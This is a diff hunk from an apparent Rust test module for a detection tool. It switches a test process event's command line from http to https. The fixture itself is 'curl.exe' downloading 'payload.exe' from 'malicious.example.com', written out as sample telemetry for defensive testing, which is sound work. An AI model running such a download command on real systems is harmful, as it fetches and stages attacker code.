@@ -1112,7 +1112,7 @@ mod tests {
             data: json!({
                 "ProcessId": 4567,
                 "Image": r"C:\Windows\System32\curl.exe",
-                "CommandLine": "curl.exe http://malicious.example.com/payload.exe -o payload.exe"
+                "CommandLine": "curl.exe https://malicious.example.com/payload.exe -o payload.exe"
             }),
             causal_parent: None,
         };
